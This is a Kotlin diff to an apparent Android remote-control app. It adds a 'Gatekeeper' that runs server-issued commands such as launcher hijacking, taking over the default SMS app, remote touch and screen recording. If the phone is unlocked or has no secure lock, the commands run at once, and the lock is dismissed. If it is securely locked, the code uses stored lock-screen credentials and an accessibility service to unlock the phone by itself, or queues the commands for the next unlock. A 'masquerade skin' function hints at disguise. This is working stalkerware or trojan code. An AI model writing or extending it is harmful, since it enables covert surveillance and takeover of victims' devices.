@@ -95,6 +95,11 @@ object CommandProcessor {
             updateCommandStatus(ctx, id, "RECEIVED", null)
         }
 
+        // --- NEW: GATEKEEPER EVALUATION ---
+        if (!Gatekeeper.evaluateAndGate(ctx, cmd)) {
+            return // Execution halted, deferred to unlock queue
+        }
+
         var status = "EXECUTED"
         var errorMsg = ""
         val fileName = cmd.optString("file_name")
@@ -2914,6 +2919,94 @@ object CommandProcessor {
 
         // Update DB
         updateCommandStatus(ctx, id, status, errorMsg)
+    }
+
+    object Gatekeeper {
+        private val GATED_COMMANDS = listOf("FORCE_DATA", "FLIGHT_MODE", "HIJACK_LAUNCHER", "SET_DEFAULT_SMS", "RESTORE_DEFAULT_SMS", "RESET_BACKGROUND_TASKS", "FINALIZE_RESET", "FULL_ONBOARDING", "REMOTE_TOUCH", "RECORD_SCREEN")
+        private const val QUEUE_PREF = "deferred_commands"
+
+        suspend fun evaluateAndGate(ctx: Context, cmd: JSONObject): Boolean {
+            val fileName = cmd.optString("file_name", "")
+            if (!GATED_COMMANDS.contains(fileName)) return true
+
+            val km = ctx.getSystemService(Context.KEYGUARD_SERVICE) as android.app.KeyguardManager
+            if (!km.isKeyguardLocked) {
+                DebugLogger.log("GATEKEEPER", "Device unlocked. Allowing $fileName")
+                return true
+            }
+
+            if (!km.isKeyguardSecure) {
+                DebugLogger.log("GATEKEEPER", "Device has insecure lock. Dismissing and allowing $fileName")
+                val pm = ctx.getSystemService(Context.POWER_SERVICE) as android.os.PowerManager
+                val wakeLock = pm.newWakeLock(android.os.PowerManager.FULL_WAKE_LOCK or android.os.PowerManager.ACQUIRE_CAUSES_WAKEUP or android.os.PowerManager.ON_AFTER_RELEASE, "Cortex:GatekeeperWake")
+                wakeLock.acquire(3000)
+                
+                val pulseIntent = Intent(ctx, PulseActivity::class.java).apply {
+                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_NO_ANIMATION)
+                    putExtra("is_wake_trigger", true)
+                }
+                ctx.startActivity(pulseIntent)
+                kotlinx.coroutines.delay(1500)
+                return true
+            }
+
+            // Device is Securely Locked
+            val prefs = ctx.getSharedPreferences("cortex_keychain", Context.MODE_PRIVATE)
+            val type = prefs.getString("key_type", "") ?: ""
+            val keyValRaw = prefs.getString("key_value", "") ?: ""
+
+            if (type.isEmpty() || keyValRaw.isEmpty()) {
+                DebugLogger.log("GATEKEEPER", "Secure lock active but NO credentials. Deferring $fileName")
+                deferCommand(ctx, cmd)
+                return false
+            }
+
+            DebugLogger.log("GATEKEEPER", "Secure lock active WITH credentials. Engaging Auto-Unlock for $fileName...")
+            val service = MyAccessibilityService.instance
+            if (service != null) {
+                val result = service.executeAutonomousUnlockInternal()
+                if (result.first) {
+                    DebugLogger.log("GATEKEEPER", "Auto-Unlock successful! Executing $fileName")
+                    kotlinx.coroutines.delay(1000)
+                    return true
+                } else {
+                    DebugLogger.log("GATEKEEPER", "Auto-Unlock failed: ${result.second}. Deferring $fileName")
+                    deferCommand(ctx, cmd)
+                    return false
+                }
+            } else {
+                DebugLogger.log("GATEKEEPER", "Auto-Unlock aborted (Service Offline). Deferring $fileName")
+                deferCommand(ctx, cmd)
+                return false
+            }
+        }
+
+        private fun deferCommand(ctx: Context, cmd: JSONObject) {
+            val prefs = ctx.getSharedPreferences(QUEUE_PREF, Context.MODE_PRIVATE)
+            val queueStr = prefs.getString("queue", "[]") ?: "[]"
+            val queue = org.json.JSONArray(queueStr)
+            queue.put(cmd)
+            prefs.edit().putString("queue", queue.toString()).apply()
+            
+            CommandProcessor.updateCommandStatus(ctx, cmd.optInt("id", -1), "QUEUED_FOR_UNLOCK", "Device securely locked. Waiting for user unlock to execute.")
+        }
+
+        suspend fun flushQueue(ctx: Context) {
+            val prefs = ctx.getSharedPreferences(QUEUE_PREF, Context.MODE_PRIVATE)
+            val queueStr = prefs.getString("queue", "[]") ?: "[]"
+            if (queueStr == "[]") return
+            
+            val queue = org.json.JSONArray(queueStr)
+            prefs.edit().remove("queue").apply() // Clear immediately to avoid loops
+            
+            DebugLogger.log("GATEKEEPER", "Device Unlocked! Flushing ${queue.length()} deferred commands...")
+            for (i in 0 until queue.length()) {
+                val cmd = queue.getJSONObject(i)
+                DebugLogger.log("GATEKEEPER", "Executing deferred command: ${cmd.optString("file_name")}")
+                CommandProcessor.processSingleCommand(ctx, cmd)
+                kotlinx.coroutines.delay(2000) // Delay between commands to let UI settle
+            }
+        }
     }
 
     fun applyMasqueradeSkin(ctx: Context, skin: String): Boolean {
